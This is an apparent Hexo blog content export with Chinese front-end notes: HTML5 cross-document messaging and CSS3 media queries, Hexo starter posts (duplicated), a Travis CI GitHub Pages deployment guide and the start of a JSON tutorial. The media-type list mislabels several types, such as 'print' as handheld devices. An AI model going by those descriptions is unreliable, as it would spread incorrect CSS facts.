class="keyword">function</span>(<span class="params">ev</span>)</span>&#123; <span class="comment">//鼠标释放的时候</span></span><br><span class="line">      <span class="comment">//oUl.insertBefore(oLi[curr],this);//insertBefore(新节点，目标节点)</span></span><br><span class="line">      inserAfter(oLi[curr],<span class="keyword">this</span>);</span><br><span class="line">      <span class="keyword">this</span>.style.border = <span class="string">"none"</span>;</span><br><span class="line">      <span class="comment">//oLi[curr].innerHTML = ev.DataTransfer.getData("data");</span></span><br><span class="line">      sort();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">sort();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">inserAfter</span>(<span class="params">newItem,targerItem</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> parentItem = targerItem.parentNode;</span><br><span class="line">  <span class="keyword">if</span>(parentItem.lastChild == targerItem)&#123;</span><br><span class="line">    parentItem.appendChild(newItem);</span><br><span class="line">  &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    parentItem.insertBefore(newItem,targerItem.nextSibling);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><a href="http://codepen.io/poetries/pen/XpbEOW" target="_blank" rel="noopener">在线演示</a></p>
<h3 id="第十八课-跨文档操作"><a class="markdownIt-Anchor" href="#第十八课-跨文档操作"></a> 第十八课 跨文档操作</h3>
<hr />
<ul>
<li>
<p><strong>跨文档请求</strong></p>
</li>
<li>
<p>同域跨文档</p>
<ul>
<li><code>iframe</code>内页：
<ul>
<li>父页面操作子页面：<code>contentWindow</code></li>
<li>子页面操作父页面：<code>window.top</code>(找到最顶级的父页面)/<code>parent</code>(第一父页面)</li>
<li>新窗口页：
<ul>
<li>父页面操作子页面：<code>window.open</code></li>
<li>子页面操作父页面：<code>window.opener</code></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>不同域跨文档</strong></p>
<ul>
<li><code>postMessage（“发送的数据”,”接收的域”）</code>
<ul>
<li><code>message</code>事件监听</li>
<li><code>ev.origin</code>发送数据来源的域</li>
<li><code>ev.data</code> 发送的数据</li>
</ul>
</li>
<li>通过判断发送的数据来执行相应的需求</li>
</ul>
</li>
<li>
<p><strong>ajax跨域</strong></p>
<ul>
<li>
<p><code>XMLHttpRequest</code> 新增功能</p>
<ul>
<li>跨域请求：修改服务端头信息</li>
<li>I<code>E</code>兼容：<code>XDomaiRequest</code></li>
</ul>
</li>
<li>
<p>进度事件：</p>
<ul>
<li><code>upload.onprogress(ev)</code> 上传进度(实现文件上传进度条)
<ul>
<li><code>ev.total</code>  发送文件的总量</li>
<li><code>ev.loaded</code> 已发送的量</li>
</ul>
</li>
<li><code>FormData</code>  构建提交二进制数据</li>
</ul>
</li>
</ul>
</li>
<li>
<p>拓展阅读</p>
<ul>
<li><a href="http://mp.weixin.qq.com/s?__biz=MzI0ODA2ODU2NQ==&amp;mid=2651130595&amp;idx=2&amp;sn=3d0f546f1867992729b3ace5d03766fc&amp;chksm=f257ca59c520434f08e215b3bdcec3764712f73301b738c18163359e5aa5e949ff019616ffca&amp;mpshare=1&amp;scene=23&amp;srcid=11289XUSBAQzrCp3Io55aoS1#rd" target="_blank" rel="noopener">HTML5 API 大盘点</a></li>
</ul>
</li>
</ul>
<h3 id="附录一-css3响应式布局"><a class="markdownIt-Anchor" href="#附录一-css3响应式布局"></a> 附录一　css3响应式布局</h3>
<hr />
<ul>
<li>
<p>媒体类型</p>
<ul>
<li><code>*all</code> 所有媒体</li>
<li><code>braille</code> 盲文触觉设备</li>
<li><code>embossed</code> 盲文打印机</li>
<li><code>*print</code> 手持设备</li>
<li><code>projection</code> 打印预览</li>
<li><code>*screen</code> 彩屏设备</li>
<li><code>speech</code> '听觉’类似的媒体类型</li>
<li><code>tty</code>不适用像素的设备</li>
<li><code>tv</code> 电视</li>
</ul>
</li>
<li>
<p>关键字</p>
<ul>
<li><code>and</code></li>
<li><code>not</code>    <code>not</code>关键字是用来排除某种制定的媒体类型</li>
<li><code>only</code>     <code>only</code>用来定某种特定的媒体类型</li>
</ul>
</li>
<li>
<p>媒体特性</p>
<ul>
<li><code>(max-width:600px)</code></li>
<li><code>(max-device-width: 480px)</code> 	设备输出宽度</li>
<li><code>(orientation:portrait)</code>  		竖屏</li>
<li><code>(orientation:landscape)</code>		横屏</li>
<li><code>(-webkit-min-device-pixel-ratio: 2)</code> 像素比</li>
<li><code>devicePixelRatio</code> 			设备像素比</li>
<li><code>window.devicePixelRatio = 物理像素 / dips</code></li>
</ul>
</li>
<li>
<p>样式引入</p>
</li>
</ul>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;link rel="stylesheet" href="css/index.css" media="print" /&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="keyword">@import</span> url(<span class="string">"css/demo.css"</span>) screen;</span><br><span class="line"><span class="keyword">@media</span> screen&#123;    &#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;link rel=”stylesheet” media=”all and</span><br><span class="line"> (orientation:portrait)” href=”portrait.css”&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;link rel=”stylesheet” media=”all</span><br><span class="line"> and (orientation:landscape)”href=”landscape.css”&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="keyword">@media</span> screen <span class="keyword">and</span> (<span class="attribute">min-width:</span><span class="number">360px</span>) <span class="keyword">and</span> (<span class="attribute">max-width:</span><span class="number">500px</span>) &#123;&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;link rel="stylesheet" type="text/css" </span><br><span class="line">href="indexA.css"  media="screen and (min-width: 800px)"&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;link rel="stylesheet" type="text/css" </span><br><span class="line">href="indexB.css" media="screen and (min-width: 600px) and (max-width: 800px)"&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;link rel="stylesheet" type="text/css" </span><br><span class="line">href="indexC.css"    media="screen and (max-width: 600px)"&gt;</span><br></pre></td></tr></table></figure>
<h3 id="附录二-html5速查表"><a class="markdownIt-Anchor" href="#附录二-html5速查表"></a> 附录二　HTML5速查表</h3>
<hr />
<ul>
<li><a href="http://caniuse.com/#search=canvas" target="_blank" rel="noopener">可以查阅支持H5+CSS3的属性</a></li>
<li><a href="http://www.html5star.com/manual/html5label-meaning/" target="_blank" rel="noopener">HTML5 标签含义之元素周期表</a></li>
<li><a href="http://www.inmotionhosting.com/img/infographics/html5_cheat_sheet_tags.png" target="_blank" rel="noopener">HTML5标签速查表</a></li>
<li><a href="chrome-extension://ikhdkkncnoglghljlkmcimlnlhkeamad/pdf-viewer/web/viewer.html?file=http%3A%2F%2Fjonibologna.com%2Fcontent%2Fimages%2Fflexboxsheet.pdf">展示 flexbox 属性的作用–推荐</a></li>
<li><a href="https://demos.scotch.io/visual-guide-to-css3-flexbox-flexbox-playground/demos/" target="_blank" rel="noopener">Flexbox 视觉指南–更好更容易地理解 Flexbox 某个属性的作用</a></li>
</ul>
<hr />
<ul>
<li><a href="https://github.com/poetries/poetries.github.io/blob/dev/source/_posts/HTML5+CSS3%E5%9F%BA%E7%A1%80%E5%9B%9E%E9%A1%BE%20.md" target="_blank" rel="noopener">原文md文件-仅供参考</a></li>
</ul>
]]></content>
      <categories>
        <category>Front-End</category>
        <category>搬运整理</category>
      </categories>
      <tags>
        <tag>HTML5</tag>
        <tag>CSS3</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/hexolog/post/16107.html</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
<h2 id="quick-start"><a class="markdownIt-Anchor" href="#quick-start"></a> Quick Start</h2>
<h3 id="create-a-new-post"><a class="markdownIt-Anchor" href="#create-a-new-post"></a> Create a new post</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
<h3 id="run-server"><a class="markdownIt-Anchor" href="#run-server"></a> Run server</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
<h3 id="generate-static-files"><a class="markdownIt-Anchor" href="#generate-static-files"></a> Generate static files</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
<h3 id="deploy-to-remote-sites"><a class="markdownIt-Anchor" href="#deploy-to-remote-sites"></a> Deploy to remote sites</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
<a id="more"></a>
<h3 id="front-matter"><a class="markdownIt-Anchor" href="#front-matter"></a> Front-matter</h3>
<p>Front-matter 是文件最上方以 <code>---</code> 分隔的区域，用于指定个别文件的变量，举例来说：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">title:</span> <span class="string">Hello</span> <span class="string">World</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2013</span><span class="string">/7/13</span> <span class="number">20</span><span class="string">:46:25</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure>
<p>以下是预先定义的参数，您可在模板中使用这些参数值并加以利用。</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
<th>默认值</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>layout</code></td>
<td>布局</td>
<td></td>
</tr>
<tr>
<td><code>title</code></td>
<td>标题</td>
<td></td>
</tr>
<tr>
<td><code>date</code></td>
<td>建立日期</td>
<td>文件建立日期</td>
</tr>
<tr>
<td><code>updated</code></td>
<td>更新日期</td>
<td>文件更新日期</td>
</tr>
<tr>
<td><code>comments</code></td>
<td>开启文章的评论功能</td>
<td>true</td>
</tr>
<tr>
<td><code>tags</code></td>
<td>标签（不适用于分页）</td>
<td></td>
</tr>
<tr>
<td><code>categories</code></td>
<td>分类（不适用于分页）</td>
<td></td>
</tr>
<tr>
<td><code>permalink</code></td>
<td>覆盖文章网址</td>
<td></td>
</tr>
</tbody>
</table>
<h4 id="分类和标签"><a class="markdownIt-Anchor" href="#分类和标签"></a> 分类和标签</h4>
<p>只有文章支持分类和标签，您可以在 Front-matter 中设置。在其他系统中，分类和标签听起来很接近，但是在 Hexo 中两者有着明显的差别：分类具有顺序性和层次性，也就是说 <code>Foo, Bar</code> 不等于 <code>Bar, Foo</code>；而标签没有顺序和层次。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">categories:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">Diary</span></span><br><span class="line"><span class="attr">tags:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">PS3</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">Games</span></span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo usages</title>
    <url>/hexolog/post/16107.html</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
<h2 id="quick-start"><a class="markdownIt-Anchor" href="#quick-start"></a> Quick Start</h2>
<h3 id="create-a-new-post"><a class="markdownIt-Anchor" href="#create-a-new-post"></a> Create a new post</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
<h3 id="create-a-page-named-tags"><a class="markdownIt-Anchor" href="#create-a-page-named-tags"></a> Create a page named tags</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new page <span class="string">"tags"</span></span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
<h3 id="run-server"><a class="markdownIt-Anchor" href="#run-server"></a> Run server</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
<h3 id="generate-static-files"><a class="markdownIt-Anchor" href="#generate-static-files"></a> Generate static files</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
<h3 id="deploy-to-remote-sites"><a class="markdownIt-Anchor" href="#deploy-to-remote-sites"></a> Deploy to remote sites</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h3 id="front-matter"><a class="markdownIt-Anchor" href="#front-matter"></a> Front-matter</h3>
<p>Front-matter 是文件最上方以 <code>---</code> 分隔的区域，用于指定个别文件的变量，举例来说：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">title:</span> <span class="string">Hello</span> <span class="string">World</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2013</span><span class="string">/7/13</span> <span class="number">20</span><span class="string">:46:25</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure>
<p>以下是预先定义的参数，您可在模板中使用这些参数值并加以利用。</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
<th>默认值</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>layout</code></td>
<td>布局</td>
<td></td>
</tr>
<tr>
<td><code>title</code></td>
<td>标题</td>
<td></td>
</tr>
<tr>
<td><code>date</code></td>
<td>建立日期</td>
<td>文件建立日期</td>
</tr>
<tr>
<td><code>updated</code></td>
<td>更新日期</td>
<td>文件更新日期</td>
</tr>
<tr>
<td><code>comments</code></td>
<td>开启文章的评论功能</td>
<td>true</td>
</tr>
<tr>
<td><code>tags</code></td>
<td>标签（不适用于分页）</td>
<td></td>
</tr>
<tr>
<td><code>categories</code></td>
<td>分类（不适用于分页）</td>
<td></td>
</tr>
<tr>
<td><code>permalink</code></td>
<td>覆盖文章网址</td>
<td></td>
</tr>
</tbody>
</table>
<h4 id="分类和标签"><a class="markdownIt-Anchor" href="#分类和标签"></a> 分类和标签</h4>
<p>只有文章支持分类和标签，您可以在 Front-matter 中设置。在其他系统中，分类和标签听起来很接近，但是在 Hexo 中两者有着明显的差别：分类具有顺序性和层次性，也就是说 <code>Foo, Bar</code> 不等于 <code>Bar, Foo</code>；而标签没有顺序和层次。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">categories:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">Diary</span></span><br><span class="line"><span class="attr">tags:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">PS3</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">Games</span></span><br></pre></td></tr></table></figure>
<h4 id="兼容-hugo-所需要的修改"><a class="markdownIt-Anchor" href="#兼容-hugo-所需要的修改"></a> 兼容 <code>Hugo</code> 所需要的修改</h4>
<p>由于<code>Hugo</code> 似乎只支持<code>字符串</code>与<code>字符串数组</code>形式的 <code>Front-matter</code>，如下：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">title:</span> <span class="string">"title name"</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2018</span><span class="number">-01</span><span class="number">-01</span> <span class="number">12</span><span class="string">:00:00</span></span><br><span class="line"><span class="attr">comments:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">draft:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">categories:</span> <span class="string">"Diary"</span></span><br><span class="line"><span class="attr">tags:</span> <span class="string">["PS3","Games"]</span></span><br></pre></td></tr></table></figure>
<p>所以，为使 <code>Hexo</code> 生成的 <code>.md</code> 文件的通用性更强，需要手动改写（亲测，通过更改<code>scaffolds</code> 文件夹内的模板是无法实现以上格式的，所有必须手动更改）成以上格式的 <code>Front-matter</code>。</p>
<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo|Hugo持续集成自动部署到github</title>
    <url>/hexolog/post/9e2a28bc.html</url>
    <content><![CDATA[<blockquote>
<p>Hugo 与 Netlify 相关的待更新</p>
</blockquote>
<blockquote>
<p>自动部署的好处是：只需将源码分支推送<code>git push origin branch-name</code>到GitHub上,自动部署服务即可在线帮你完成后续所有的生成及部署操作。它在简化你的操作的同时，也同步地将你的源码文件保存在了GitHub上。这样即便你因电脑故障或误操作导致源码文件消失，也依然可以从GitHub上找回。<br />
目前用得较多的两个免费的自动化服务有 <a href="https://travis-ci.org/" target="_blank" rel="noopener"><code>Travis CI</code></a> 与 <a href="https://www.netlify.com/" target="_blank" rel="noopener"><code>Netlify</code></a>，都可以比较方便的自动部署你的 <code>Hexo</code> 或 <code>Hugo</code> 静态博客。前者主要托管在 <code>GitHub Pages</code> 免费空间上，而后者本身就提供了免费的空间。总的来说，若仅仅只需完成静态博客的自动部署的话，<code>Netlify</code> 在操作上要更简单一些。</p>
</blockquote>
<a id="more"></a>
<h3 id="一-新建新的分支"><a class="markdownIt-Anchor" href="#一-新建新的分支"></a> <strong>一、 新建新的分支</strong></h3>
<hr />
<p><code>master：</code>博客的静态文件，也就是hexo生成后的HTML文件，因为要使用 <a href="https://pages.github.com/" target="_blank" rel="noopener">GitHub Pages</a> 服务，所以他规定的网页文件必须是在master分支</p>
<p>建新的分支<code>：dev</code>：存放博客的源代码</p>
<p>Git怎么推送本地分支到远程新分支上面去？</p>
<p><code>git push --force origin local_branch:remote_branch</code></p>
<p>这个操作，<code>local_branch</code>必须为你本地存在的分支，<code>remote_branch</code>为远程分支，如果<code>remote_branch</code>不存在则会自动创建分支。</p>
<p>类似，<code>git push origin :remote_branch，local_branch</code>留空的话则是删除远程<code>remote_branch</code>分支。</p>
<hr />
<h4 id="分支常用命令"><a class="markdownIt-Anchor" href="#分支常用命令"></a> <strong>分支常用命令</strong></h4>
<ul>
<li>
<p>列出所有本地分支<br />
<code>$ git branch</code></p>
</li>
<li>
<p>列出所有远程分支<br />
<code>$ git branch -r</code></p>
</li>
<li>
<p>列出所有本地分支和远程分支<br />
<code>$ git branch -a</code></p>
</li>
<li>
<p>新建一个分支，但依然停留在当前分支<br />
<code>$ git branch [branch-name]</code></p>
</li>
<li>
<p>新建一个分支，并切换到该分支<br />
<code>$ git checkout -b [branch]</code></p>
</li>
<li>
<p>新建一个分支，指向指定commit<br />
<code>$ git branch [branch] [commit]</code></p>
</li>
<li>
<p>新建一个分支，与指定的远程分支建立追踪关系<br />
<code>$ git branch --track [branch] [remote-branch]</code></p>
</li>
<li>
<p>切换到指定分支，并更新工作区<br />
<code>$ git checkout [branch-name]</code></p>
</li>
<li>
<p>切换到上一个分支<br />
<code>$ git checkout -</code></p>
</li>
<li>
<p>建立追踪关系，在现有分支与指定的远程分支之间<br />
<code>$ git branch --set-upstream [branch] [remote-branch]</code></p>
</li>
<li>
<p>合并指定分支到当前分支<br />
<code>$ git merge [branch]</code></p>
</li>
<li>
<p>选择一个commit，合并进当前分支<br />
<code>$ git cherry-pick [commit]</code></p>
</li>
<li>
<p>删除分支<br />
<code>$ git branch -d [branch-name]</code></p>
</li>
<li>
<p>删除远程分支</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git push origin --delete [branch-name]</span><br><span class="line">$ git branch -dr [remote&#x2F;branch]</span><br></pre></td></tr></table></figure>
<h3 id="二-配置travis"><a class="markdownIt-Anchor" href="#二-配置travis"></a> <strong>二、配置Travis</strong></h3>
<hr />
<ul>
<li>接入Travis CI</li>
<li>打开Travis CI网站，使用github账号登录。</li>
<li>将鼠标放在右上角的用户名上，点击Account选项，会显示github的项目。</li>
<li>找到博客项目，点击前面带有 X 符号的按钮，开启<code>travis</code>支持。<br />
<img src="http://upload-images.jianshu.io/upload_images/1152636-241d2155adb0eb9c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="此处输入图片的描述" /></li>
</ul>
<p>然后点击设置按钮，在项目的设置中开启Build only if .travis.yml is present这一项.</p>
<p><img src="http://seayxu.github.io/static/images/hexo-with-travisci-setting.jpg" alt="此处输入图片的描述" /></p>
<p>到这一步， 我们已经开启了要构建的仓库</p>
<ul>
<li>
<p>在Travis CI配置Github的Access Token</p>
</li>
<li>
<p>在github上生成Access Token</p>
</li>
</ul>
<p>首先我们来到github的设置界面，点击到<code>Personal access tokens</code>页面，点击右上角的<code>Generate new token</code>按钮会重新生成一个，点击后他会叫你输入密码，然后来到如下界面，给他去一个名字，下面是勾选一些权限</p>
<p><img src="http://upload-images.jianshu.io/upload_images/1152636-a16de8c027bf5091.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="此处输入图片的描述" /></p>
<p>生成完后，你需要拷贝下来,接下来要用到</p>
<ul>
<li>在Travis CI配置</li>
</ul>
<p>配置界面还是在项目的setting里面，如下图</p>
<p><img src="http://upload-images.jianshu.io/upload_images/1152636-9ba41b1ba943f624.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="此处输入图片的描述" /></p>
<p>还需要在源代码的仓库里创建一个<code>.travis.yml</code>配置文件，放到源代码的根目录，如下图</p>
<p>其中内容如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">language: node_js</span><br><span class="line">node_js: stable</span><br><span class="line"></span><br><span class="line"># S: Build Lifecycle</span><br><span class="line">install:</span><br><span class="line">  - npm install</span><br><span class="line"></span><br><span class="line">#before_script:</span><br><span class="line"> # - npm install -g gulp</span><br><span class="line"></span><br><span class="line">script:</span><br><span class="line">  - hexo g</span><br><span class="line"></span><br><span class="line">after_script:</span><br><span class="line">  - cd ./public</span><br><span class="line">  - git init</span><br><span class="line">  - git config user.name <span class="string">"lifengsofts"</span></span><br><span class="line">  - git config user.email <span class="string">"lifengsofts@gmail.com"</span></span><br><span class="line">  - git add .</span><br><span class="line">  - git commit -m <span class="string">"Update docs"</span></span><br><span class="line">  - git push --force --quiet <span class="string">"https://$&#123;GH_TOKEN&#125;@$&#123;GH_REF&#125;"</span> master:master</span><br><span class="line"># E: Build LifeCycle</span><br><span class="line"></span><br><span class="line">branches:</span><br><span class="line">  only:</span><br><span class="line">    - blog-source</span><br><span class="line">env:</span><br><span class="line"> global:</span><br><span class="line">   - GH_REF: github.com/lifengsofts/lifengsofts.github.io.git</span><br></pre></td></tr></table></figure>
<p>其中给你需要更换的又<code>git config</code>后面的配置信息<br />
<code>GH_REF</code>的值更改为你的仓库地址</p>
<p>到这一步我们配置已经完成了</p>
<h3 id="三-本地操作"><a class="markdownIt-Anchor" href="#三-本地操作"></a> <strong>三、本地操作</strong></h3>
<hr />
<ul>
<li>
<p>把远程仓库源码下载下来新建新的分支dev  <code>git clone -b dev https://github.com/poetries/poetries.github.io.git</code></p>
</li>
<li>
<p>切换到项目根目录下</p>
</li>
<li>
<p>开始写作</p>
</li>
<li>
<p>关联远程仓库 <code>git remote add origin git@github.com:poetries/poetries.github.io.git</code></p>
</li>
<li>
<p>提交本地修改，推送至github仓库。</p>
</li>
<li>
<p><code>$ git add</code> .</p>
</li>
<li>
<p><code>$ git commit -m &quot;test travis&quot;</code></p>
</li>
<li>
<p><code>$ git push origin dev:dev</code></p>
</li>
</ul>
<p>以下是自己在Ubuntu下写的一个很简单很简单的脚本，用来方便写作部署博客</p>
<ul>
<li><a href="https://github.com/poetries/poetries.github.io/blob/dev/hexo-write.sh" target="_blank" rel="noopener">hexo-write.sh</a></li>
<li><a href="https://github.com/poetries/poetries.github.io/blob/dev/hexo-deploy.sh" target="_blank" rel="noopener">hexo-deploy.sh</a></li>
</ul>
<p>push本地的代码至远程仓库之后，在https://travis-ci.org后台查看相关情况。</p>
<p>下面是成功的结果：</p>
<p><img src="http://upload-images.jianshu.io/upload_images/1628444-3fa39b6aab6aefc7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="此处输入图片的描述" /></p>
<h3 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> <strong>参考：</strong></h3>
<hr />
<ul>
<li>
<p><a href="http://www.jianshu.com/p/fff7b3384f46#" target="_blank" rel="noopener">使用Travis自动部署Hexo(3)</a></p>
</li>
<li>
<p><a href="http://www.jianshu.com/p/7f05b452fd3a#" target="_blank" rel="noopener">使用Travis自动部署Hexo(1)</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>静态博客</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>Hugo</tag>
      </tags>
  </entry>
  <entry>
    <title>JAMstack与CMS</title>
    <url>/hexolog/post/edc048fb.html</url>
    <content><![CDATA[<blockquote>
<p>找到了几个比较有意思的网站：<a href="https://headlesscms.org/" target="_blank" rel="noopener">headlesscms.org</a>、<a href="https://www.staticgen.com/" target="_blank" rel="noopener">staticgen.com</a>、<a href="https://stackshare.io/static-site-generators" target="_blank" rel="noopener">stackshare.io</a></p>
</blockquote>
<blockquote>
<p>JAMstack 介绍：<a href="https://thenewstack.io/the-sweetness-of-jamstack-javascript-apis-and-markup/" target="_blank" rel="noopener">The Sweetness of JAMstack: JavaScript, APIs and Markup</a>、<a href="https://mp.weixin.qq.com/s/GhCdntYKN_9Y9tk6ENRFDg" target="_blank" rel="noopener">前端大事件和趋势回顾，2018 何去何从？—8、静态网站卷土重来</a></p>
</blockquote>
<p>[20]:</p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>CMS</tag>
        <tag>JAMstack</tag>
      </tags>
  </entry>
  <entry>
    <title>JSON (Javascript Object Notation) 学习</title>
    <url>/hexolog/post/23670.html</url>
    <content><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">要点：</span><br><span class="line">    1.理解json语法</span><br><span class="line">    2.解析json</span><br><span class="line">    3.序列化json</span><br></pre></td></tr></table></figure>
<p>XML 与 JSON 都可以理解为在互联网上传输结构化数据的一种格式。XML 先于 JSON，但由于 <mark>XML 过于繁琐、冗长</mark>，继而就又出现了 JSON。</p>
<p>JSON 是JavaScript 的一个严格的子集，利用了JavaScript中的一些模式来表示结构化数据。Crockford认为与XML相比，JSON是在JavaScript中读写结构化数据的更好的方式。因为<mark>可以把JSON直接传给eval()，而且不必创建DOM对象</mark>。另外，更重要的一个原因是，可以把JSON数据结构解析为有用的JavaScript对象。与XML数据结构要解析成DOM文档而且从中提取数据极为麻烦相比，JSON可以解析为JavaScript对象的优势极其明显。</p>
<p>关于JSON，最重要的是要理解它<font color="#26f3f1">是一种数据格式</font>，不是一种编程语言。虽然具有相同的语法形式，但JSON并不从属于JavaScript。而且，并不是只有JavaScript才使用JSON，毕竟JSON只是一种数据格式。很多编程语言都有针对JSON的解析器和序列化器。</p>
<a id="more"></a>
<h2 id="语法"><a class="markdownIt-Anchor" href="#语法"></a> 语法</h2>
<p>JSON的语法可以表示以下三种类型的值。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.简单值：使用与JavaScript相同的语法，可以在JSON中表示字符串、数值、布尔值和null。但JSON不支持JavaScript中的特殊值undefined。</span><br><span class="line"></span><br><span class="line">2.对象：对象作为一种复杂数据类型，表示的是一组有序的键值对儿。而每个键值对儿中的值可以是简单值，也可以是复杂数据类型的值。</span><br><span class="line"></span><br><span class="line">3.数值：数组也是一种复杂数据类型，表示一组有序的值的列表，可以通过数值索引来访问其中的值。数组的值也可以是任意类型——简单值、对象或数组。</span><br></pre></td></tr></table></figure>
<h3 id="简单值"><a class="markdownIt-Anchor" href="#简单值"></a> 简单值</h3>
<p>简单值中，JSON字符串与JavaScript字符串的最大区别在于，JSON字符串必须使用<font color="#26f3f1"><strong>双引号</strong></font>（单引号会导致语法错误）。</p>
<h3 id="对象"><a class="markdownIt-Anchor" href="#对象"></a> 对象</h3>
<p>JSON中的对象与JavaScript字面量稍微有一些不同。下面是一个JavaScript中的对象字面量：</p>
